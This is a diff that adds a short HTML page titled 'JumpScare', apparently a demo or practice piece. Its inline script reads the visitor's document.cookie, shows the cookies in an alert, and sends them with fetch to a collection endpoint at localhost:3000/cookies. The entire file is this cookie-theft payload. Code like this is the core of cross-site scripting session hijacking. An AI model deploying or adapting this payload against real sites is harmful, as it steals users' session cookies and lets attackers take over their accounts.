@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JumpScare</title>
+</head>
+<body>
+    <script>
+
+        const cookies = document.cookie;
+        alert("Cookies obtenidas: " + cookies);
+
+
+        fetch(`http://localhost:3000/cookies?cookies=${cookies}`, { 
+            method: 'GET',  
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log('Respuesta del servidor:', data);  
+        })
+    </script>
+</body>
+</html>
